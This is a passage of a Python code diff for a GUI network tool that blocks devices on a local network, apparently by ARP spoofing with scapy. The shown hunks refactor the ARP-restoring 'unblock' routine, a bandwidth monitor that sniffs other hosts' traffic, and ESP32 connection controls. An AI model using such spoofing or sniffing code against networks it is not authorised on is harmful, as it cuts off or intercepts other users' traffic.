             self.gui_log_output(
-                f"Restoring ARP for {len(devices_to_unblock)} devices on interface {unblocking_interface}...", "green")
+                f"Restoring ARP for {len(devices_to_restore)} devices on interface {selected_interface}...", "green")
             logger.info(
-                f"Initiating ARP restoration for {len(devices_to_unblock)} devices on interface {unblocking_interface}.")
+                f"Initiating ARP restoration for {len(devices_to_restore)} devices on interface {selected_interface}.")
 
-            for device in devices_to_unblock:
-                ip_address = device['ip']
+            for device in devices_to_restore:
+                target_ip = device['ip']
 
-                victim_mac = get_mac(ip_address, iface=unblocking_interface)  # Pass interface to get_mac
-                gateway_mac = get_mac(gateway_ip, iface=unblocking_interface)  # Pass interface
+                # Get the actual MAC of the target and gateway
+                target_actual_mac = get_mac(target_ip, iface=selected_interface)
+                gateway_actual_mac = get_mac(gateway_ip, iface=selected_interface)
 
-                if victim_mac and gateway_mac:
-                    packet_victim = Ether(dst=victim_mac) / ARP(op=2, pdst=ip_address, psrc=gateway_ip,
-                                                                hwdst=victim_mac, hwsrc=gateway_mac)
-                    packet_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip_address,
-                                                                  hwdst=gateway_mac, hwsrc=victim_mac)
+                if target_actual_mac and gateway_actual_mac:
+                    # Restore target's ARP table: target should see gateway's real MAC for gateway_ip
+                    packet_victim = Ether(dst=target_actual_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip,
+                                                                       hwdst=target_actual_mac, hwsrc=gateway_actual_mac)
+                    # Restore gateway's ARP table: gateway should see target's real MAC for target_ip
+                    packet_gateway = Ether(dst=gateway_actual_mac) / ARP(op=2, pdst=gateway_ip, psrc=target_ip,
+                                                                         hwdst=gateway_actual_mac, hwsrc=target_actual_mac)
 
-                    sendp(packet_victim, verbose=0, count=7, iface=unblocking_interface)  # Specify interface
-                    sendp(packet_gateway, verbose=0, count=7, iface=unblocking_interface)  # Specify interface
-                    self.gui_log_output(f"Restored ARP for IP: {ip_address}", "green")
-                    logger.info(f"ARP restored for {ip_address} on interface {unblocking_interface}")
+                    sendp(packet_victim, verbose=0, count=7, iface=selected_interface)
+                    sendp(packet_gateway, verbose=0, count=7, iface=selected_interface)
+                    self.gui_log_output(f"Restored ARP for IP: {target_ip}", "green")
+                    logger.info(f"ARP restored for {target_ip} on interface {selected_interface}")
                 else:
                     self.gui_log_output(
-                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway on interface {unblocking_interface}).",
+                        f"Could not fully restore ARP for {target_ip} (MAC missing for target or gateway on interface {selected_interface}).",
                         "warning")
                     logger.warning(
-                        f"Could not restore ARP for {ip_address} (MAC missing for victim or gateway on interface {unblocking_interface}).")
+                        f"Could not fully restore ARP for {target_ip} (MAC missing for target or gateway on interface {selected_interface}).")
                 time.sleep(0.5)
 
-            self.gui_log_output("All devices should now be unblocked.", "green")
-            messagebox.showinfo("Unblock Complete", "All devices have been unblocked.")
-            logger.info("All devices unblocked successfully.")
+            self.gui_log_output("All blocking operations stopped and devices should now be unblocked.", "green")
+            messagebox.showinfo("Unblock Complete", "Tất cả các thiết bị đã được bỏ chặn.")
+            logger.info("All blocking operations stopped and devices unblocked successfully.")
+            self.active_block_operations.clear()  # Ensure the dictionary is empty
 
         except Exception as e:
             self.gui_log_output(f"Error during unblocking: {e}", "red")
             logger.critical(f"Critical error during unblocking: {e}")
         finally:
-            self.root.after(0, lambda: self._set_ui_busy_state(False))
-            self.root.after(0, lambda: self.blocking_status_label.configure(text="Status: Idle",
-                                                                            text_color=self.colors['text_dim']))
-            self.blocked_device_ip = None
-            self.blocked_device_mac = None
+            self.root.after(0, self._check_and_update_global_blocking_status)  # Final update of UI
 
     # --- Bandwidth Monitoring Functions ---
     def _start_stop_bandwidth_monitor(self):
@@ -947,10 +1126,16 @@ class NetworkToolGUI:
             self.gui_log_output("Cannot start bandwidth monitor: No valid interface selected.", "yellow")
             return
 
+        if self.blocking_active:
+            messagebox.showwarning("Cảnh báo", "Không thể chạy theo dõi băng thông khi đang chặn thiết bị.")
+            self.gui_log_output("Cannot start bandwidth monitor while blocking is active.", "yellow")
+            return
+
         if not self.bandwidth_monitor_active:
-            if not self.my_ip:
+            my_ip, _, _ = self._get_interface_details_for_selected()
+            if not my_ip:
                 messagebox.showwarning("Cảnh báo", "Không thể lấy địa chỉ IP của bạn. Vui lòng kiểm tra kết nối mạng.")
-                self.gui_log_output("Cannot start bandwidth monitor: Local IP not determined.", "yellow")
+                self.gui_log_output("Cannot start bandwidth monitor: Local IP not determined for selected interface.", "yellow")
                 return
 
             if not self.bandwidth_display_labels:
@@ -973,7 +1158,7 @@ class NetworkToolGUI:
             self.bandwidth_thread.start()
             self.bandwidth_update_job_id = self.root.after(self.bandwidth_monitor_interval_ms,
                                                            self._update_bandwidth_gui)
-            self._set_ui_busy_state(False)  # Release UI busy state, only bandwidth button remains changed
+            self.root.after(0, lambda: self._set_ui_busy_state(False))  # Release UI busy state, only bandwidth button remains changed
         else:
             self._stop_bandwidth_monitor_task()
 
@@ -1002,7 +1187,7 @@ class NetworkToolGUI:
 
             with self.bandwidth_lock:
                 self.current_bytes_per_ip.clear()
-            self._set_ui_busy_state(False)  # Release UI busy state
+            self.root.after(0, lambda: self._set_ui_busy_state(False))  # Release UI busy state
 
     def _bandwidth_sniff_task(self, interface):
         """
@@ -1033,10 +1218,12 @@ class NetworkToolGUI:
             ip_dst = packet[scapy.IP].dst
             packet_len = len(packet)
 
+            my_ip, _, _ = self._get_interface_details_for_selected()
+
             with self.bandwidth_lock:
-                if ip_src != self.my_ip and ip_src in self.bandwidth_display_labels:
+                if ip_src != my_ip and ip_src in self.bandwidth_display_labels:
                     self.current_bytes_per_ip[ip_src] += packet_len
-                if ip_dst != self.my_ip and ip_dst in self.bandwidth_display_labels:
+                if ip_dst != my_ip and ip_dst in self.bandwidth_display_labels:
                     self.current_bytes_per_ip[ip_dst] += packet_len
 
     def _update_bandwidth_gui(self):
@@ -1171,7 +1358,6 @@ class NetworkToolGUI:
             return
 
         self._set_ui_busy_state(True)  # Disable other controls and ESP32 controls
-        # The ESP32 button itself will be updated by _update_esp32_button_state via _set_ui_busy_state
         self.gui_log_output(f"Attempting to connect to ESP32 on {selected_port} at {self.esp32_baud_rate} baud...",
                             "blue")
         threading.Thread(target=self._esp32_connect_task, args=(selected_port, self.esp32_baud_rate,),
@@ -1316,7 +1502,8 @@ class NetworkToolGUI:
         Updates the text, color, and state of the ESP32 connect button,
         port dropdown, and refresh button based on connection status and overall UI busy state.
         """
-        if ui_busy:
+        if ui_busy or self.blocking_active or self.bandwidth_monitor_active:
+            # If any other major operation is busy, disable ESP32 controls entirely.
             self.btn_esp32_connect.configure(state="disabled")
             self.esp32_port_optionmenu.configure(state="disabled")
             self.btn_refresh_esp32_ports.configure(state="disabled")
